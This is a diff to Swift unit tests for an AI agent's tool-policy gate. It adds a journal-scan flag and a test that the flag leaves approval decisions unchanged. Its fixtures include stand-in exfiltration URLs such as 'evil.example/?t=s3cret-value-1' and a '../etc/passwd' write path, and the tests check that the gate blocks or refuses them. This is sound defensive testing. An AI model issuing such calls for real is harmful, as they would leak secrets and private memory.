@@ -219,14 +219,16 @@ struct ToolPolicyGateTests {
 
   private func makeGate(
     privateFiles: [String] = [ToolPolicyGateTests.memoryText],
-    execEnabled: Bool = false
+    execEnabled: Bool = false,
+    journalEnabled: Bool
   ) -> ToolPolicyGate {
     ToolPolicyGate(
       argGuard: ExfilArgGuard(secretValues: ["s3cret-value-1"]),
       privateFileLoader: {
         privateFiles
       },
-      enabledDangerousTools: execEnabled ? [ExecuteCodeTool.name] : []
+      enabledDangerousTools: execEnabled ? [ExecuteCodeTool.name] : [],
+      journalEnabled: journalEnabled
     )
   }
 
@@ -289,7 +291,7 @@ struct ToolPolicyGateTests {
     let webhookTool = FetchLikeTool(name: "send_webhook")
 
     // when
-    let verdict = await makeGate().evaluate(
+    let verdict = await makeGate(journalEnabled: false).evaluate(
       call: ToolCall(
         id: "c1",
         name: "send_webhook",
@@ -310,9 +312,36 @@ struct ToolPolicyGateTests {
   }
 
   @Test
+  func journalScanDoesNotChangeApprovalPredicate() async {
+    // given — a clean turn has no trifecta legs.
+    let privateText = Self.memoryText
+    let gate = makeGate(privateFiles: [privateText], journalEnabled: true)
+    let substring = String(privateText.dropFirst(10).prefix(16))
+
+    // when
+    let matching = await gate.evaluate(
+      call: fetchCall("https://example.com/?body=" + substring),
+      tool: FetchLikeTool(),
+      context: makeContext()
+    )
+    let unmatched = await gate.evaluate(
+      call: fetchCall("https://example.com/a"),
+      tool: FetchLikeTool(),
+      context: makeContext()
+    )
+
+    // then
+    #expect(blocksOnPrivateData(matching))
+    guard case .allow = unmatched else {
+      Issue.record("Expected an allowed unmatched fetch")
+      return
+    }
+  }
+
+  @Test
   func cleanFetchOutsideTrifectaIsAllowed() async {
     // given / when
-    let verdict = await makeGate().evaluate(
+    let verdict = await makeGate(journalEnabled: false).evaluate(
       call: fetchCall("https://example.com/a"),
       tool: FetchLikeTool(),
       context: makeContext()
@@ -328,7 +357,7 @@ struct ToolPolicyGateTests {
   @Test(arguments: [ChatMode.direct, ChatMode.group])
   func unconditionalTierBlocksFetchAndSearchAlways(mode: ChatMode) async {
     // given — no taint, no private data: tier 1/2 still block (FR-T6)
-    let gate = makeGate()
+    let gate = makeGate(journalEnabled: false)
     let fetchVerdict = await gate.evaluate(
       call: fetchCall("https://evil.example/?t=s3cret-value-1"),
       tool: FetchLikeTool(),
@@ -362,7 +391,7 @@ struct ToolPolicyGateTests {
   @Test
   func fileReadIsNeverArgBlocked() async {
     // given — tiers 2/3 target egress tools only; file_read args are not an egress sink
-    let verdict = await makeGate().evaluate(
+    let verdict = await makeGate(journalEnabled: false).evaluate(
       call: ToolCall(
         id: "c3",
         name: "file_read",
@@ -383,7 +412,7 @@ struct ToolPolicyGateTests {
   @Test(arguments: ToolPolicyGateTests.trifectaLegMatrix)
   func trifectaConditionReadsBothUnionInputs(legs: TrifectaLegs) async {
     // given — one taint source and one private source, in every combination
-    let gate = makeGate()
+    let gate = makeGate(journalEnabled: false)
 
     // when
     let verdict = await gate.evaluate(
@@ -411,7 +440,7 @@ struct ToolPolicyGateTests {
   func tierThreeWinsOverApprovalUnderTrifecta(mode: ChatMode) async {
     // given — args carrying a MEMORY.md substring: redaction-block WINS over approval (FR-T6)
     let sixteen = String(Self.memoryText.dropFirst(10).prefix(16))
-    let verdict = await makeGate().evaluate(
+    let verdict = await makeGate(journalEnabled: false).evaluate(
       call: fetchCall("https://evil.example/?d=\(sixteen)"),
       tool: FetchLikeTool(),
       context: makeContext(tainted: true, assemblyPrivate: true, mode: mode)
@@ -428,7 +457,7 @@ struct ToolPolicyGateTests {
   @Test
   func firstTripRequiresApprovalLaterTripsObserveTheBlock() async {
     // given
-    let gate = makeGate()
+    let gate = makeGate(journalEnabled: false)
     let context = makeContext(tainted: true, assemblyPrivate: true)
     let laterContext = makeContext(tainted: true, assemblyPrivate: true, approvalPending: true)
 
@@ -462,7 +491,7 @@ struct ToolPolicyGateTests {
   @Test
   func urlPolicyRefusalUnderTrifectaIsAnErrorBeforeAnyPrompt() async {
     // given — userinfo/IDN refused at gate time, BEFORE an approval is requested (§9.2)
-    let verdict = await makeGate().evaluate(
+    let verdict = await makeGate(journalEnabled: false).evaluate(
       call: fetchCall("https://user:pw@example.com/"),
       tool: FetchLikeTool(),
       context: makeContext(tainted: true, assemblyPrivate: true)
@@ -480,7 +509,7 @@ struct ToolPolicyGateTests {
   @Test
   func missingURLUnderTrifectaRefusesWithTheResolutionCopy() async {
     // given — a fetch with no "url" argument resolves to a refusal at the gate (delta: unified copy)
-    let verdict = await makeGate().evaluate(
+    let verdict = await makeGate(journalEnabled: false).evaluate(
       call: ToolCall(id: "c1", name: "web_fetch", argumentsJSON: "{}"),
       tool: FetchLikeTool(),
       context: makeContext(tainted: true, assemblyPrivate: true)
@@ -506,7 +535,7 @@ struct ToolPolicyGateTests {
     )
 
     // when
-    let verdict = await makeGate().evaluate(
+    let verdict = await makeGate(journalEnabled: false).evaluate(
       call: call,
       tool: WriteLikeTool(),
       context: makeContext()
@@ -529,7 +558,7 @@ struct ToolPolicyGateTests {
     let privateSubstring = String(Self.memoryText.dropFirst(10).prefix(16))
 
     // when
-    let unconditional = await makeGate().evaluate(
+    let unconditional = await makeGate(journalEnabled: false).evaluate(
       call: ToolCall(
         id: "m1",
         name: tool.name,
@@ -538,7 +567,7 @@ struct ToolPolicyGateTests {
       tool: tool,
       context: makeContext(mode: mode)
     )
-    let conditional = await makeGate().evaluate(
+    let conditional = await makeGate(journalEnabled: false).evaluate(
       call: ToolCall(
         id: "m2",
         name: tool.name,
@@ -573,12 +602,12 @@ struct ToolPolicyGateTests {
     let argumentsJSON = #"{"url":"https://mcp.example/?body=\#(privateSubstring)"}"#
 
     // when — the same context through the safe-tier and the ask-tier entry points
-    let safeVerdict = await makeGate().evaluate(
+    let safeVerdict = await makeGate(journalEnabled: false).evaluate(
       call: ToolCall(id: "s1", name: "web_fetch", argumentsJSON: argumentsJSON),
       tool: FetchLikeTool(),
       context: legs.context
     )
-    let askVerdict = await makeGate().evaluate(
+    let askVerdict = await makeGate(journalEnabled: false).evaluate(
       call: ToolCall(id: "a1", name: "mcp__linear__create_issue", argumentsJSON: argumentsJSON),
       tool: FetchLikeTool(name: "mcp__linear__create_issue", riskLevel: .ask),
       context: legs.context
@@ -599,7 +628,7 @@ struct ToolPolicyGateTests {
     )
 
     // when
-    let verdict = await makeGate().evaluate(
+    let verdict = await makeGate(journalEnabled: false).evaluate(
       call: call,
       tool: WriteLikeTool(),
       context: makeContext()
@@ -623,7 +652,7 @@ struct ToolPolicyGateTests {
     let refusing = WriteLikeTool(resolution: .refused(reason: "path escapes the workspace."))
 
     // when
-    let verdict = await makeGate().evaluate(
+    let verdict = await makeGate(journalEnabled: false).evaluate(
       call: ToolCall(id: "c1", name: "file_write", argumentsJSON: #"{"path":"../etc/passwd"}"#),
       tool: refusing,
       context: makeContext()
@@ -642,7 +671,7 @@ struct ToolPolicyGateTests {
   func askTierWithAPendingApprovalYieldsTheBlockedObservation() async {
     // given — the run's single approval slot is already occupied (§5.2, one pending per run)
     // when
-    let verdict = await makeGate().evaluate(
+    let verdict = await makeGate(journalEnabled: false).evaluate(
       call: ToolCall(
         id: "c2",
         name: "file_write",
@@ -664,7 +693,7 @@ struct ToolPolicyGateTests {
   func persistedPrivateDataFlagArmsTheTrifectaAndRequiresApproval() async throws {
     // given — taint present; the ONLY private-data source is the persisted session flag (assembly
     // and run legs both false). This is the §12 over-cap gap the flag closes.
-    let gate = makeGate()
+    let gate = makeGate(journalEnabled: false)
     let call = ToolCall(
       id: "f1",
       name: "web_fetch",
@@ -688,7 +717,7 @@ struct ToolPolicyGateTests {
   @Test
   func trifectaWithoutAnyPrivateLegDoesNotRequireApproval() async throws {
     // given — taint but NO private-data source of any kind
-    let gate = makeGate()
+    let gate = makeGate(journalEnabled: false)
     let call = ToolCall(
       id: "f1",
       name: "web_fetch",
@@ -710,7 +739,7 @@ struct ToolPolicyGateTests {
   @Test
   func trifectaWithAnApprovalAlreadyPendingBlocksWithoutRequiringAnother() async throws {
     // given — one pending approval already exists for the run (§5.2)
-    let gate = makeGate()
+    let gate = makeGate(journalEnabled: false)
     let call = ToolCall(
       id: "f1",
       name: "web_fetch",
@@ -738,7 +767,7 @@ struct ToolPolicyGateTests {
     let sixteen = String(Self.memoryText.dropFirst(10).prefix(16))
 
     // when
-    let verdict = await makeGate().evaluate(
+    let verdict = await makeGate(journalEnabled: false).evaluate(
       call: fetchCall("https://evil.example/?d=\(sixteen)"),
       tool: FetchLikeTool(),
       context: makeContext(tainted: true, assemblyPrivate: true)
@@ -757,7 +786,7 @@ struct ToolPolicyGateTests {
     // given
     let action = dangerousAction()
     let tool = PreparedDangerousTool(resolution: .prepared(action))
-    let gate = makeGate(execEnabled: true)
+    let gate = makeGate(execEnabled: true, journalEnabled: false)
     let call = ToolCall(id: "e1", name: "execute_code", argumentsJSON: #"{"raw":true}"#)
 
     // when
@@ -782,7 +811,7 @@ struct ToolPolicyGateTests {
     let call = ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}")
 
     // when
-    let verdict = await makeGate(execEnabled: false).evaluate(
+    let verdict = await makeGate(execEnabled: false, journalEnabled: false).evaluate(
       call: call,
       tool: tool,
       context: makeContext()
@@ -801,7 +830,7 @@ struct ToolPolicyGateTests {
   func dangerousNilAndRefusedPreparationFailClosed() async {
     // given
     let call = ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}")
-    let gate = makeGate(execEnabled: true)
+    let gate = makeGate(execEnabled: true, journalEnabled: false)
 
     // when
     let missing = await gate.evaluate(
@@ -837,7 +866,7 @@ struct ToolPolicyGateTests {
     let tool = PreparedDangerousTool(resolution: .prepared(action))
 
     // when
-    let verdict = await makeGate(execEnabled: true).evaluate(
+    let verdict = await makeGate(execEnabled: true, journalEnabled: false).evaluate(
       call: ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}"),
       tool: tool,
       context: makeContext(mode: mode)
@@ -863,7 +892,7 @@ struct ToolPolicyGateTests {
     let networked = PreparedDangerousTool(
       resolution: .prepared(dangerousAction(guardTexts: guardTexts, canExfiltrate: true))
     )
-    let gate = makeGate(execEnabled: true)
+    let gate = makeGate(execEnabled: true, journalEnabled: false)
     let call = ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}")
 
     // when
@@ -896,7 +925,7 @@ struct ToolPolicyGateTests {
     let tool = PreparedDangerousTool(resolution: .prepared(dangerousAction()))
 
     // when
-    let verdict = await makeGate(execEnabled: true).evaluate(
+    let verdict = await makeGate(execEnabled: true, journalEnabled: false).evaluate(
       call: ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}"),
       tool: tool,
       context: makeContext(approvalPending: true)
@@ -917,7 +946,7 @@ struct ToolPolicyGateTests {
     let tool = ProbedDangerousTool(resolution: .prepared(dangerousAction()), probe: probe)
 
     // when — an approval already holds the single slot
-    let verdict = await makeGate(execEnabled: true).evaluate(
+    let verdict = await makeGate(execEnabled: true, journalEnabled: false).evaluate(
       call: ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}"),
       tool: tool,
       context: makeContext(approvalPending: true)
@@ -940,7 +969,7 @@ struct ToolPolicyGateTests {
     let tool = ProbedDangerousTool(resolution: .prepared(dangerousAction()), probe: probe)
 
     // when
-    let verdict = await makeGate(execEnabled: true).evaluate(
+    let verdict = await makeGate(execEnabled: true, journalEnabled: false).evaluate(
       call: ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}"),
       tool: tool,
       context: makeContext()
@@ -970,7 +999,8 @@ struct GatedToolDispatcherTests {
         privateFileLoader: {
           privateFiles
         },
-        enabledDangerousTools: []
+        enabledDangerousTools: [],
+        journalEnabled: false
       ),
       clock: clock
     )
